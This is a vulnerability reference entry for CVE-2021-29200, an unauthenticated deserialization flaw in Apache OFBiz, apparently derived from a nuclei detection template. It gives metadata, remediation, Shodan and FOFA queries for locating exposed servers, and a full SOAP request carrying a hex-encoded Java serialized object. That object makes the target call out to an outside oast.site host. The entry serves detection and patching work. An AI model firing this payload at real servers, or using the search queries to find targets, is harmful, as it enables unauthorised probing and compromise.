---
layout: post
cve_id: CVE-2021-29200
title: Apache OFBiz < 17.12.07 - Arbitrary Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-29200.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-29200.yaml
snort2_rule: N/A
snort3_rule: N/A
author: your3cho
severity: critical
impact: 'Unauthenticated attackers can exploit unsafe deserialization to execute arbitrary
  code, leading to complete server compromise.

  '
remediation: 'Upgrade to Apache OFBiz version 17.12.07 or later.

  '
reference:
- http://www.openwall.com/lists/oss-security/2021/04/27/4
- https://nvd.nist.gov/vuln/detail/CVE-2021-29200
- https://github.com/freeide/CVE-2021-29200
- https://lists.apache.org/thread.html/r108a964764b8bd21ebd32ccd4f51c183ee80a251c105b849154a8e9d%40%3Ccommits.ofbiz.apache.org%3E
- https://lists.apache.org/thread.html/r708351f1a8af7adb887cc3d8a92bed8fcbff4a9e495e69a9ee546fda%40%3Cnotifications.ofbiz.apache.org%3E
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-29200
  cwe-id: CWE-502
  epss-score: 0.92497
  epss-percentile: 0.9972
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: ofbiz
  shodan-query:
  - html:"OFBiz"
  - http.html:"ofbiz"
  - ofbiz.visitor=
  fofa-query:
  - app="Apache_OFBiz"
  - body="ofbiz"
  - app="apache_ofbiz"
tags:
- cve2021
- cve
- apache
- ofbiz
- deserialization
- rce
- vuln
---

## ðŸ” Vulnerability Description
Apache OFBiz has unsafe deserialization prior to 17.12.07 version An unauthenticated user can perform an RCE attack


## ðŸŒ HTTP Request
```nohighlight
POST /webtools/control/SOAPService HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_6; de) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.2 Safari/605.1.15
Connection: close
Content-Length: 1131
Content-Type: application/xml
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
    <soapenv:Body>
      <ser>
        <map-HashMap>
          <map-Entry>
            <map-Key>
              <cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74002b643569753575686c65306f326537366e30766a677865726f776f6d6d6f6b756e372e6f6173742e7369746574000071007e0005740004687474707078740032687474703a2f2f643569753575686c65306f326537366e30766a677865726f776f6d6d6f6b756e372e6f6173742e7369746578</cus-obj>
            </map-Key>
            <map-Value>
              <std-String value="STDSTRING"/>
            </map-Value>
          </map-Entry>
        </map-HashMap>
     </ser>
  </soapenv:Body>
</soapenv:Envelope>
```

